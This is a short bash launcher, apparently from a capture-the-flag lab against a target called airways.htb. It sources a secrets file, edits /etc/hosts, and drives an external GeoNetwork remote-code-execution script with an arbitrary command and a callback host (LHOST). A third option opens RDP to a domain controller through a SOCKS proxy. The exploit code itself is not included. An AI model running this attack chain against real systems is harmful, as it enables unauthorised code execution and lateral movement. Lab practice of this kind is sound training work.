#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT/scripts"
if [[ -f "$ROOT/secrets.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$ROOT/secrets.env"
  set +a
fi

usage() {
  cat <<EOF
usage: $0 hosts|rce|rdp
  hosts  append geo.airways.htb / airways.htb to /etc/hosts
  rce    upload+trigger formatter (FORMATTER_CMD, TARGET, LHOST)
  rdp    Isabel RDP to DC01 (needs SOCKS)
EOF
}

cmd="${1:-}"
case "$cmd" in
  hosts)
    ip="${TARGET:?set TARGET}"
    grep -q 'geo.airways.htb' /etc/hosts || echo "$ip geo.airways.htb airways.htb chat.airways.htb" | sudo tee -a /etc/hosts
    ;;
  rce)
    : "${FORMATTER_CMD:?set FORMATTER_CMD}"
    python3 ./01-geonetwork-rce.py --base "http://geo.airways.htb" --cmd "$FORMATTER_CMD"
    ;;
  rdp)
    exec ./04-rdp-dc.sh
    ;;
  *)
    usage
    exit 1
    ;;
esac
